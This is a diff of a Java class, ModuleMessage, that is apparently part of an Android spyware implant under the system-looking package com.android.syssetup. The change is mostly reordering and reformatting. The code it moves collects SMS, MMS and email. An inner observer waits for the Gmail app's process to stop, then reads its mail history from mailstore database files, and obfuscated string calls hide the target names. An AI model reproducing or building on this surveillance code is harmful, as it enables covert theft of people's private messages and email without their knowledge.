@@ -9,16 +9,7 @@
 
 package com.android.syssetup.module;
 
-import java.io.File;
-import java.io.FilenameFilter;
-import java.io.IOException;
-import java.io.UnsupportedEncodingException;
-import java.util.ArrayList;
-import java.util.Date;
-import java.util.Hashtable;
-import java.util.Iterator;
-import java.util.concurrent.Semaphore;
-
+import com.android.mm.M;
 import com.android.syssetup.ProcessInfo;
 import com.android.syssetup.ProcessStatus;
 import com.android.syssetup.Status;
@@ -48,11 +39,20 @@ import com.android.syssetup.util.Check;
 import com.android.syssetup.util.DataBuffer;
 import com.android.syssetup.util.DateTime;
 import com.android.syssetup.util.WChar;
-import com.android.mm.M;
+
+import java.io.File;
+import java.io.FilenameFilter;
+import java.io.IOException;
+import java.io.UnsupportedEncodingException;
+import java.util.ArrayList;
+import java.util.Date;
+import java.util.Hashtable;
+import java.util.Iterator;
+import java.util.concurrent.Semaphore;
 
 /**
  * The Class MessageAgent.
- * 
+ *
  * @author zeno -> Ahahah ti piacerebbe eh?? :>
  * @real-author Que, r0x -> vantatene pure.
  * @bug-sterminator zeno
@@ -66,24 +66,23 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	private static final int ID_SMS = 1;
 	private static final int ID_MMS = 2;
 	private static final int MAIL_PROGRAM = 2;
-	private boolean mailEnabled;
-	private boolean smsEnabled;
-	private boolean mmsEnabled;
-
 	MsgHandler msgHandler;
-
 	Markup storedMMS;
 	Markup storedSMS;
 	Markup storedMAIL;
-
+	ProcessMailObserver obs;
+	Semaphore stillReadingEmail = new Semaphore(1);
+	private boolean mailEnabled;
+	private boolean smsEnabled;
+	private boolean mmsEnabled;
 	private Markup configMarkup;
 	private Hashtable<String, Integer> lastMail = new Hashtable<String, Integer>();
 	private int lastMMS;
 	private int lastSMS;
-	private Filter[] filterCollect = new Filter[3];
-	private Filter[] filterRuntime = new Filter[3];
 
 	// private SmsHandler smsHandler;
+	private Filter[] filterCollect = new Filter[3];
+	private Filter[] filterRuntime = new Filter[3];
 
 	@Override
 	public boolean parse(ConfModule conf) {
@@ -95,8 +94,8 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		storedMAIL = new Markup(this, 4);
 		configMarkup = new Markup(this, 3);
 
-		String[] config = new String[] { "", "", "" };
-		String[] oldConfig = new String[] { "", "", "" };
+		String[] config = new String[]{"", "", ""};
+		String[] oldConfig = new String[]{"", "", ""};
 		if (configMarkup.isMarkup()) {
 			try {
 				oldConfig = (String[]) configMarkup.readMarkupSerializable();
@@ -107,7 +106,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (parse) Error: " + e);
 				}
-				oldConfig = new String[] { "", "", "" };
+				oldConfig = new String[]{"", "", ""};
 			}
 		} else {
 			if (Cfg.DEBUG) {
@@ -187,37 +186,6 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 		return enabled;
 	}
-
-	class ProcessMailObserver implements Observer<ProcessInfo> {
-
-		private String pObserving = M.e("com.google.android.gm");
-
-		@Override
-		public int notification(ProcessInfo process) {
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): " + process);
-			}
-			if (process.processInfo.contains(pObserving)) {
-				if (process.status == ProcessStatus.STOP) {
-					try {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (notification), observing found: " + process.processInfo);
-						}
-						readHistoricMail(lastMail);
-					} catch (IOException e) {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (notification) Error: " + e);
-						}
-					}
-				}
-			}
-			return 0;
-		}
-
-	}
-
-	ProcessMailObserver obs;
 
 	@Override
 	public void actualStart() {
@@ -361,8 +329,6 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		}
 	}
 
-	Semaphore stillReadingEmail = new Semaphore(1);
-
 	private String[] getMailStores(String databasePath) {
 		File dir = new File(databasePath);
 		File parent = new File(dir.getParent());
@@ -377,8 +343,8 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 				return fileName.endsWith(".db") && fileName.startsWith(M.e("mailstore."));
 			}
 		};
-		
-		if(!dir.exists()){
+
+		if (!dir.exists()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getMailStores) Error: no dir");
 			}
@@ -633,5 +599,34 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 			Check.log(TAG + " (getLastManagedSmsId): " + lastSMS);
 		}
 		return lastSMS;
+	}
+
+	class ProcessMailObserver implements Observer<ProcessInfo> {
+
+		private String pObserving = M.e("com.google.android.gm");
+
+		@Override
+		public int notification(ProcessInfo process) {
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification): " + process);
+			}
+			if (process.processInfo.contains(pObserving)) {
+				if (process.status == ProcessStatus.STOP) {
+					try {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (notification), observing found: " + process.processInfo);
+						}
+						readHistoricMail(lastMail);
+					} catch (IOException e) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (notification) Error: " + e);
+						}
+					}
+				}
+			}
+			return 0;
+		}
+
 	}
 }
